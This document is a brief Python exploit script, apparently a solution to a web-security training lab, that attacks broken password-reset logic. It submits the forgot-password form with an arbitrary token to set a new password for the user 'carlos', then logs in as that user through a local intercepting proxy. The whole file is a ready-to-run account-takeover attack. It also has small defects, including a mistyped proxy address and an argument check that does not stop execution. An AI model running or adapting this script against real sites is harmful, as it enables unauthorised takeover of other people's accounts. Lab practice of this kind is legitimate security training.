import requests
import sys
import urllib3
from colorama import Fore,init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)
credintioal = {'temp-forgot-password-token':'lord','username':'carlos','new-password-1':'password','new-password-2':'password'}


def Password_reset_broken_logic(s, url):
    print(Fore.YELLOW+ "[+] Receiving forgot-password link....")
    forgot_password_url = url + '/forgot-password?temp-forgot-password-token=lord'
    s.post(forgot_password_url, data=credintioal, verify=False, proxies=proxies)

    login_url = url + '/login'
    r = s.post(login_url, data={'username':'carlos','password':'password'}, verify=False, proxies=proxies)
    res = r.text
    if 'Log out' in res:
        print(Fore.GREEN + '[+] Login successful')
        return True
    else:
        print(Fore.RED + '[-] Unable to exploit')

def main():
    try:
        if len(sys.argv) != 2:
            print ('[-] Uasge : %s <url>' % sys.argv[0])
    except IndexError as e:
        print(f'[-] Error : {e}')
       
    s = requests.Session()    
    url = sys.argv[1]
    Password_reset_broken_logic(s, url)
    
if __name__ == "__main__":
    main()